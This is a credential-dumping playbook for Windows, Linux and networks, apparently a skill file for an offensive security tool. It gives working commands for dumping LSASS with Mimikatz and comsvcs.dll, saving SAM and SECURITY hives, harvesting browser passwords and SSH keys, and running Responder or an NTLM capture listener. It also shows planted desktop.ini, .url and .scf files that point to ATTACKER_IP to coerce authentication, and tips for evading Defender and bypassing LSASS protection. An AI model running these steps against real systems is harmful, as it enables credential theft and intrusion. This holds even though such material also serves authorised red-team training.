# Credential Dumping (Windows / Linux / Network)

## When this applies

- You have foothold (admin or local user) on a Windows or Linux host.
- Goal: extract credentials from memory, files, or registry for lateral movement, hash cracking, or PtH.

## Technique

Each OS stores credentials in well-known locations (memory, registry, files). Dump these and parse with established tools (Mimikatz, secretsdump, LaZagne).

## Steps

### 1. Windows — Mimikatz from memory

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords     # Cleartext + NTLM hashes from LSASS
sekurlsa::tickets            # Kerberos tickets
lsadump::sam                 # SAM database
lsadump::secrets             # LSA secrets
```

### 2. Windows — Dump LSASS without Mimikatz

```powershell
# ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp

# Task Manager method
# Right-click lsass.exe → Create dump file

# Comsvcs.dll method (LOLBin)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\dump.dmp full
```

Then offline:
```powershell
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

### 3. Windows — Registry hive dumps

```powershell
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

Extract with secretsdump:
```bash
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

### 4. Windows — DPAPI / Browser / SSH

```powershell
# LaZagne (all Windows credential stores)
.\laZagne.exe all

# Chrome passwords
.\SharpChrome.exe

# DPAPI master keys
mimikatz.exe "dpapi::masterkey /in:%appdata%\Microsoft\Protect\<SID>\<keyfile>"
```

### 5. Linux — files & shadow

```bash
# Password hashes (root only)
cat /etc/shadow

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Browser credentials
~/.mozilla/firefox/*.default/logins.json
~/.config/google-chrome/Default/Login\ Data

# Bash history (often contains passwords)
cat ~/.bash_history ~/.zsh_history

# Configs grep
grep -ri "password" /home 2>/dev/null
grep -ri "pass" /etc/*.conf 2>/dev/null
```

### 6. Linux — process memory

```bash
# Dump a process
gcore <pid>
strings core.<pid> | grep -i pass

# Or via /proc
cat /proc/<pid>/maps      # find heap region
dd if=/proc/<pid>/mem of=memdump bs=1 skip=<start> count=<size>
strings memdump | grep -i pass
```

### 7. Network — LLMNR/NBT-NS poisoning

```bash
# Responder (Linux)
responder -I eth0 -wrf

# Inveigh (PowerShell, Windows attacker host)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y

# Capture wire traffic for cleartext
tcpdump -i eth0 -w capture.pcap port 21 or port 23
# Then Wireshark: Telnet/FTP/HTTP basic auth often leak in plaintext
```

### 8. Custom HTTP NTLM listener (modern clients)

When DNS poisoning / WPAD / SSRF redirects an authenticated Windows client to your HTTP listener, a naive `BaseHTTPRequestHandler` listener fails: client sends Type 1 (NEGOTIATE), but never returns Type 3 (AUTHENTICATE).

Two reasons:

1. **HTTP/1.0 closes between Type 1 → Type 2 → Type 3.** NTLM is connection-bound. A single-shot HTTP/1.0 response forces a new TCP connection, which the server has no state for. Required:
   ```python
   from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
   class H(BaseHTTPRequestHandler):
       protocol_version = "HTTP/1.1"     # MANDATORY — keep-alive across the 3 messages
       # On the 401 challenge response:
       #   self.send_header('Content-Length', '0')
       #   self.send_header('Connection', 'Keep-Alive')
   ```

2. **Static / hardcoded Type 2 challenge with wrong NEGOTIATE flags causes RST.** Modern clients (PowerShell `Invoke-WebRequest`, .NET `HttpClient`, IE/Edge in intranet zone) inspect server's NTLMSSP flags and tear the connection if they don't intersect. Build Type 2 dynamically:
   - Parse the client's Type 1, extract NEGOTIATE flags, **echo** them back.
   - Add: `NTLMSSP_NEGOTIATE_NTLM | NEGOTIATE_TARGET_INFO | TARGET_TYPE_DOMAIN | NEGOTIATE_UNICODE | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_EXTENDED_SESSIONSECURITY | NEGOTIATE_VERSION`.
   - Type 2 MUST include AV pairs in TargetInfo: `MsvAvNbDomainName=2`, `MsvAvNbComputerName=1`, `MsvAvDnsDomainName=4`, `MsvAvDnsComputerName=3`, `MsvAvTimestamp=7`, `MsvAvEOL=0`.

Advertise BOTH Negotiate and NTLM:
```python
self.send_response(401)
self.send_header('WWW-Authenticate', 'Negotiate')
self.send_header('WWW-Authenticate', 'NTLM')
self.send_header('Content-Length', '0')
self.send_header('Connection', 'Keep-Alive')
self.end_headers()
```

Once Type 3 arrives, extract NetNTLMv2: `username::domain:server_challenge:NTProofStr:blob` and crack with `hashcat -m 5600`.

Reference implementation: `skills/authentication/reference/ntlm-http-listener.py`.

### 9. SMB-side NTLM coercion via planted artifacts

When you have WRITE on any SMB share path that a privileged user is likely to open in Explorer, drop a file whose Windows shell renders an icon/preview from a UNC path you control. Browsing the folder is enough — no double-click needed.

```ini
; desktop.ini — placed in the folder root (set +H +S attributes if possible)
[.ShellClassInfo]
IconResource=\\ATTACKER_IP\htb\icon.ico,0
IconFile=\\ATTACKER_IP\htb\icon.ico

; foo.url — Windows shortcut; renders icon at folder-render time
[InternetShortcut]
URL=http://example/
IconFile=\\ATTACKER_IP\htb\icon.ico
IconIndex=0

; foo.scf — older "Show Desktop" shell command, fetches IconFile on listing
[Shell]
Command=2
IconFile=\\ATTACKER_IP\htb\icon.ico
```

`.url`/`.scf`/`desktop.ini` fire on plain folder listing in Explorer — strong against locked-down RDP / Terminal Services hosts.

### 10. macOS attacker host: capturing inbound SMB on port 445

Listening on 445 from macOS Sequoia/Sonoma is fragile:
- `impacket-smbserver -ip <addr>` silently fails to bind on macOS (works on Linux). Workaround: omit `-ip`, bind wildcard.
- macOS ALF and root pf rules can drop inbound 445 even when listener binds. Run on a high port and redirect:

```bash
# Option A — userland bridge:
sudo impacket-smbserver share /tmp/share -smb2support -port 4445 &
sudo socat tcp-listen:445,reuseaddr,fork tcp:127.0.0.1:4445

# Option B — pf NAT rdr from 445 → 4445:
echo 'rdr pass on en0 proto tcp from any to any port 445 -> 127.0.0.1 port 4445' \
  | sudo pfctl -ef -
```

Verify reachability with `nbtstat -A <attacker>` from target.

## Verifying success

- Mimikatz output shows cleartext password / NTLM hash for at least one user.
- secretsdump output shows `$user::$dom:LMHASH:NTHASH:::`.
- Responder captures NetNTLMv2 hashes in `Responder.db`.

## Common pitfalls

- LSASS protected by Credential Guard / RunAsPPL → Mimikatz blocked. Need PPL bypass (LSASS unprotect drivers like `RTCore64.sys`).
- Defender flags Mimikatz signatures — use Mimikatz alternatives (NanoDump, pypykatz) or compile fresh.
- DPAPI master keys require user logon session — can't decrypt browser DBs after logout.
- Linux memory dumps require `ptrace_scope=0` (set in /proc/sys/kernel/yama).
- macOS ALF / pf rules require root + careful firewall config.

## Tools

- Mimikatz (gentilkiwi).
- secretsdump.py (impacket).
- LaZagne (multi-platform credential extractor).
- pypykatz (Python clone of Mimikatz, no Defender signatures).
- Responder / Inveigh / impacket-ntlmrelayx.
- ProcDump (Sysinternals).

## References

- MITRE ATT&CK T1003 (OS Credential Dumping).
- CWE-522 (Insufficiently Protected Credentials).
- Mimikatz: https://github.com/gentilkiwi/mimikatz
